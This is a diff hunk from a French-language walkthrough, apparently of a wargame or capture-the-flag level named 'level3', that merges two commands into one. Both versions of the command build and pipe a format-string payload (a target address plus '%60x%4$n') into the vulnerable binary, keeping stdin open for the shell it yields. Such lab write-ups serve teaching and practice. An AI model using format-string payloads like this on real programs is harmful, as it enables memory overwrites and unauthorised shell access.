@@ -66,15 +66,7 @@ Le payload sera constitué de l'adresse de `m` suivie de la chaîne de format qu
 Utilisez la commande suivante pour générer et exécuter le payload :
 
 ```bash
-python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
-```
-
-### Exécution du Payload
-
-Utilisez le payload pour exploiter le programme `level3` :
-
-```bash
-cat /tmp/exploit - | ./level3
+(python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")'; cat -) | ./level3
 ```
 
 ### Vérification
